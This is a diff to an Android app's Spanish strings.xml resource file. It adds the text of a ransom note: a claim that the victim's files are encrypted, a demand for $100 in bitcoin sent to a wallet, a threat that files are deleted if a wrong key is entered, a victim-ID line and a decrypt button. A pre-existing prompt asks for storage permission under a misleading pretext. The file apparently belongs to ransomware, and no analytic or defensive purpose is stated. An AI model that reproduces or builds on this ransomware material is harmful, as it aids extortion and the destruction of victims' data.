@@ -2,4 +2,16 @@
 <resources>
     <string name="alert_title">Se nesesitan permisos</string>
     <string name="alert_message">Esta app nesesita permiso para guardar datos cifrados en el dispositivo. Haga click en Si para permitir.</string>
+
+	
+    <string name="encrypt_message">Sus archivos fueron encriptados.</string>
+    <string name="instructions"> Necesitas enviar $ 100 en bitcoin a la cartera 27bddyb3238h para recibir la clave</string>
+
+    <string name="warning">Tenga cuidado, si intenta poner una llave inválida sus archivos se eliminarán</string>
+
+    <string name="decrypt_button"> DECRYPT! </string>
+
+    <string name="message_id"> No olvide a su bebé, su identificación es: %s </string>
+
+    <string name="tryng_decrypt"> Tratando de descifrar ... Buena suerte: D</string>
 </resources>
